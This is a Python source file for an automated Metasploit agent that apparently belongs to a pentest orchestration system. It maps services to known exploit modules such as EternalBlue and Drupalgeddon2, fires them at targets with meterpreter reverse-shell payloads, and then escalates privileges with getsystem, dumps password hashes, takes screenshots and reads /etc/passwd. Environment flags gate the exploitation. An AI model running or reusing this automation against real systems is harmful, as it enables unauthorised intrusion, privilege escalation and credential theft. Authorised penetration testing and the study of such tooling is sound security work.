#!/usr/bin/env python3
"""
Metasploit Framework Agent
Performs automated exploitation and post-exploitation using MSF
"""
import os
import sys
import json
import time
import logging
import tempfile
from typing import Dict, Any, List, Optional
from datetime import datetime
import requests
from pymetasploit3.msfrpc import MsfRpcClient
from pathlib import Path

# Add orchestrator SDK to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../orchestrator'))
from agent_sdk import AgentClient, AgentConfig

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('msf_agent')

class MetasploitAgent:
    """Metasploit Framework exploitation agent"""
    
    def __init__(self):
        self.config = AgentConfig(
            name="msf_agent",
            agent_type="exploitation",
            capabilities=["exploit", "post_exploit", "privilege_escalation"],
            version="1.0.0"
        )
        self.client = AgentClient(self.config)
        self.msf_client = None
        self.temp_dir = tempfile.mkdtemp(prefix="msf_agent_")
        
        # MSF RPC configuration
        self.msf_host = os.environ.get('MSF_HOST', 'localhost')
        self.msf_port = int(os.environ.get('MSF_PORT', 55553))
        self.msf_user = os.environ.get('MSF_USER', 'msf')
        self.msf_pass = os.environ.get('MSF_PASS', 'msf')
        
        # Safety controls
        self.allow_exploitation = os.environ.get('ALLOW_EXPLOITATION', '0') == '1'
        self.safe_mode = os.environ.get('SAFE_MODE', '1') == '1'
        
    def connect_msf(self) -> bool:
        """Connect to Metasploit RPC"""
        try:
            self.msf_client = MsfRpcClient(
                self.msf_pass,
                server=self.msf_host,
                port=self.msf_port,
                username=self.msf_user,
                ssl=False
            )
            logger.info("Connected to Metasploit RPC")
            return True
        except Exception as e:
            logger.error(f"Failed to connect to MSF RPC: {e}")
            return False
    
    def find_exploits(self, service_info: Dict[str, Any]) -> List[str]:
        """Find applicable exploits for a service"""
        exploits = []
        
        try:
            # Get service details
            service_name = service_info.get('name', '').lower()
            service_version = service_info.get('version', '')
            port = service_info.get('port')
            
            # Search for exploits
            all_exploits = self.msf_client.modules.exploits
            
            # Filter by service
            for exploit_name in all_exploits:
                exploit_info = self.msf_client.modules.use('exploit', exploit_name)
                
                # Check if exploit matches service
                if service_name in exploit_name.lower():
                    # Check version if available
                    if service_version:
                        # Simple version matching (improve this)
                        if any(v in str(exploit_info.description) for v in service_version.split('.')):
                            exploits.append(exploit_name)
                    else:
                        exploits.append(exploit_name)
                
                # Limit to prevent too many attempts
                if len(exploits) >= 5:
                    break
            
            # Add known exploit mappings
            known_exploits = {
                'vsftpd 2.3.4': 'exploit/unix/ftp/vsftpd_234_backdoor',
                'ms17-010': 'exploit/windows/smb/ms17_010_eternalblue',
                'apache struts': 'exploit/multi/http/struts2_s2_045',
                'drupalgeddon2': 'exploit/unix/webapp/drupal_drupalgeddon2',
                'tomcat': 'exploit/multi/http/tomcat_mgr_deploy',
                'weblogic': 'exploit/multi/misc/weblogic_deserialize',
                'jenkins': 'exploit/multi/http/jenkins_script_console'
            }
            
            for key, exploit in known_exploits.items():
                if key in service_name.lower() or key in service_version.lower():
                    if exploit not in exploits:
                        exploits.append(exploit)
            
        except Exception as e:
            logger.error(f"Error finding exploits: {e}")
        
        return exploits
    
    def run_exploit(self, target: str, exploit_name: str, payload_name: Optional[str] = None) -> Dict[str, Any]:
        """Run an exploit against a target"""
        result = {
            'exploit': exploit_name,
            'target': target,
            'success': False,
            'session_id': None,
            'error': None
        }
        
        if not self.allow_exploitation:
            result['error'] = "Exploitation not allowed (ALLOW_EXPLOITATION=0)"
            return result
        
        try:
            # Use the exploit module
            exploit = self.msf_client.modules.use('exploit', exploit_name)
            
            # Set target
            exploit['RHOSTS'] = target
            
            # Set payload if specified
            if payload_name:
                exploit.payload = payload_name
            else:
                # Use default payload
                compatible_payloads = exploit.payloads
                if compatible_payloads:
                    # Prefer meterpreter
                    for p in compatible_payloads:
                        if 'meterpreter' in p:
                            exploit.payload = p
                            break
                    else:
                        exploit.payload = compatible_payloads[0]
            
            # Configure payload
            if hasattr(exploit, 'payload'):
                exploit['LHOST'] = os.environ.get('LHOST', '0.0.0.0')
                exploit['LPORT'] = 4444
            
            # Execute exploit
            self.client.post_event("warning", f"Attempting exploitation: {exploit_name} -> {target}")
            
            job_id = exploit.execute()
            
            # Wait for completion (with timeout)
            timeout = 60
            start = time.time()
            
            while time.time() - start < timeout:
                # Check for new sessions
                sessions = self.msf_client.sessions.list
                for sid, session_info in sessions.items():
                    if session_info.get('target_host') == target:
                        result['success'] = True
                        result['session_id'] = sid
                        result['session_type'] = session_info.get('type')
                        self.client.post_event("success", f"Exploitation successful! Session {sid} created")
                        return result
                
                # Check if job completed
                if job_id not in self.msf_client.jobs.list:
                    break
                
                time.sleep(2)
            
            result['error'] = "Exploitation attempt completed but no session created"
            
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"Exploitation failed: {e}")
        
        return result
    
    def run_post_exploitation(self, session_id: str) -> List[Dict[str, Any]]:
        """Run post-exploitation modules on a session"""
        findings = []
        
        if not self.allow_exploitation:
            return findings
        
        try:
            session = self.msf_client.sessions.session(session_id)
            
            # Get system info
            if session.type == 'meterpreter':
                sysinfo = session.run_cmd('sysinfo')
                findings.append({
                    'type': 'system_info',
                    'data': sysinfo
                })
                
                # Check privileges
                getuid = session.run_cmd('getuid')
                findings.append({
                    'type': 'current_user',
                    'data': getuid
                })
                
                # Try to escalate privileges
                if 'root' not in getuid.lower() and 'system' not in getuid.lower():
                    # Try getsystem on Windows
                    if 'windows' in sysinfo.lower():
                        try:
                            session.run_cmd('getsystem')
                            new_privs = session.run_cmd('getuid')
                            if 'system' in new_privs.lower():
                                findings.append({
                                    'type': 'privilege_escalation',
                                    'success': True,
                                    'method': 'getsystem',
                                    'data': new_privs
                                })
                        except:
                            pass
                    
                    # Try local exploit suggester
                    try:
                        suggester = self.msf_client.modules.use('post', 'multi/recon/local_exploit_suggester')
                        suggester['SESSION'] = session_id
                        result = suggester.execute()
                        findings.append({
                            'type': 'exploit_suggestions',
                            'data': result
                        })
                    except:
                        pass
                
                # Dump hashes (if privileged)
                if 'root' in getuid.lower() or 'system' in getuid.lower():
                    if 'windows' in sysinfo.lower():
                        try:
                            hashdump = session.run_cmd('hashdump')
                            findings.append({
                                'type': 'credential_dump',
                                'data': hashdump,
                                'sensitive': True
                            })
                        except:
                            pass
                
                # Screenshot (if GUI session)
                try:
                    screenshot = session.run_cmd('screenshot')
                    findings.append({
                        'type': 'screenshot',
                        'data': 'Screenshot captured'
                    })
                except:
                    pass
                    
            elif session.type == 'shell':
                # Basic shell commands
                commands = ['id', 'whoami', 'hostname', 'uname -a', 'cat /etc/passwd']
                for cmd in commands:
                    try:
                        output = session.run_cmd(cmd)
                        findings.append({
                            'type': f'command_{cmd.replace(" ", "_")}',
                            'data': output
                        })
                    except:
                        pass
            
        except Exception as e:
            logger.error(f"Post-exploitation error: {e}")
        
        return findings
    
    def process_vulnerability(self, vuln_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Process a vulnerability for potential exploitation"""
        if not self.allow_exploitation:
            return None
        
        result = {
            'vulnerability': vuln_data,
            'exploitation_attempted': False,
            'success': False,
            'findings': []
        }
        
        # Check if we have enough info to exploit
        target = vuln_data.get('target') or vuln_data.get('host')
        port = vuln_data.get('port')
        service = vuln_data.get('service', {})
        cve = vuln_data.get('cve')
        
        if not target:
            return result
        
        # Find applicable exploits
        exploits = []
        
        if cve:
            # Search for CVE-specific exploits
            cve_search = cve.replace('CVE-', '').replace('-', '_')
            for exploit in self.msf_client.modules.exploits:
                if cve_search in exploit:
                    exploits.append(exploit)
        
        if service:
            exploits.extend(self.find_exploits(service))
        
        if not exploits:
            return result
        
        # Try exploits (limit attempts)
        for exploit_name in exploits[:3]:
            if self.safe_mode:
                # In safe mode, only report what would be done
                result['findings'].append({
                    'type': 'exploit_available',
                    'exploit': exploit_name,
                    'target': target,
                    'safe_mode': True
                })
            else:
                # Attempt exploitation
                exploit_result = self.run_exploit(target, exploit_name)
                result['exploitation_attempted'] = True
                
                if exploit_result['success']:
                    result['success'] = True
                    result['session_id'] = exploit_result['session_id']
                    
                    # Run post-exploitation
                    post_findings = self.run_post_exploitation(exploit_result['session_id'])
                    result['findings'].extend(post_findings)
                    
                    break  # Stop after successful exploitation
        
        return result
    
    def execute_job(self, job: Dict[str, Any]) -> Dict[str, Any]:
        """Execute exploitation job"""
        try:
            self.client.post_event("info", f"Starting exploitation job {job['id']}")
            
            # Connect to MSF if not connected
            if not self.msf_client and not self.connect_msf():
                return {
                    'status': 'failed',
                    'error': 'Could not connect to Metasploit Framework'
                }
            
            job_type = job.get('params', {}).get('type', 'vulnerability_exploit')
            results = []
            
            if job_type == 'vulnerability_exploit':
                # Process vulnerabilities for exploitation
                vulnerabilities = job.get('params', {}).get('vulnerabilities', [])
                
                for vuln in vulnerabilities:
                    result = self.process_vulnerability(vuln)
                    if result:
                        results.append(result)
                        
                        # Report findings
                        if result.get('success'):
                            self.client.post_finding(
                                job['id'],
                                title=f"Successful exploitation of {vuln.get('title', 'vulnerability')}",
                                severity='critical',
                                category='Exploitation',
                                description=f"Successfully exploited vulnerability on {vuln.get('target')}",
                                evidence={'exploitation_result': result}
                            )
            
            elif job_type == 'direct_exploit':
                # Direct exploitation attempt
                target = job.get('params', {}).get('target')
                exploit_name = job.get('params', {}).get('exploit')
                
                if target and exploit_name:
                    exploit_result = self.run_exploit(target, exploit_name)
                    results.append(exploit_result)
                    
                    if exploit_result['success']:
                        # Run post-exploitation
                        post_findings = self.run_post_exploitation(exploit_result['session_id'])
                        
                        # Report critical finding
                        self.client.post_finding(
                            job['id'],
                            title=f"Successful exploitation using {exploit_name}",
                            severity='critical',
                            category='Exploitation',
                            description=f"Successfully gained access to {target}",
                            evidence={
                                'exploit': exploit_name,
                                'session_id': exploit_result['session_id'],
                                'post_exploitation': post_findings
                            }
                        )
            
            elif job_type == 'privilege_escalation':
                # Privilege escalation on existing session
                session_id = job.get('params', {}).get('session_id')
                
                if session_id:
                    findings = self.run_post_exploitation(session_id)
                    results.append({
                        'session_id': session_id,
                        'findings': findings
                    })
                    
                    # Check for successful privilege escalation
                    for finding in findings:
                        if finding.get('type') == 'privilege_escalation' and finding.get('success'):
                            self.client.post_finding(
                                job['id'],
                                title='Successful privilege escalation',
                                severity='critical',
                                category='Post-Exploitation',
                                description=f"Successfully escalated privileges on session {session_id}",
                                evidence=finding
                            )
            
            # Save results as artifact
            report_path = Path(self.temp_dir) / 'exploitation_report.json'
            with open(report_path, 'w') as f:
                json.dump({
                    'job_type': job_type,
                    'timestamp': datetime.utcnow().isoformat(),
                    'results': results
                }, f, indent=2)
            
            self.client.upload_artifact(
                job['id'],
                str(report_path),
                'exploitation_report.json',
                'application/json'
            )
            
            self.client.post_event("success", f"Exploitation job completed")
            
            return {
                'status': 'completed',
                'results': results
            }
            
        except Exception as e:
            logger.error(f"Job execution failed: {e}")
            self.client.post_event("error", f"Job failed: {str(e)[:500]}")
            return {
                'status': 'failed',
                'error': str(e)
            }
    
    def run(self):
        """Main agent loop"""
        logger.info("Metasploit Agent starting...")
        logger.info(f"Exploitation enabled: {self.allow_exploitation}")
        logger.info(f"Safe mode: {self.safe_mode}")
        
        # Register with orchestrator
        if not self.client.register():
            logger.error("Failed to register with orchestrator")
            return
        
        logger.info("Successfully registered with orchestrator")
        
        try:
            while True:
                # Heartbeat
                if not self.client.heartbeat():
                    logger.warning("Heartbeat failed, re-registering...")
                    if not self.client.register():
                        time.sleep(30)
                        continue
                
                # Try to lease a job
                job = self.client.lease_job()
                if job:
                    logger.info(f"Leased job: {job['id']}")
                    
                    # Execute the job
                    result = self.execute_job(job)
                    
                    # Mark job complete
                    self.client.complete_job(job['id'], result)
                    logger.info(f"Completed job: {job['id']}")
                else:
                    # No jobs available, wait
                    time.sleep(10)
                    
        except KeyboardInterrupt:
            logger.info("Agent shutting down...")
        except Exception as e:
            logger.error(f"Agent error: {e}")

if __name__ == "__main__":
    agent = MetasploitAgent()
    agent.run()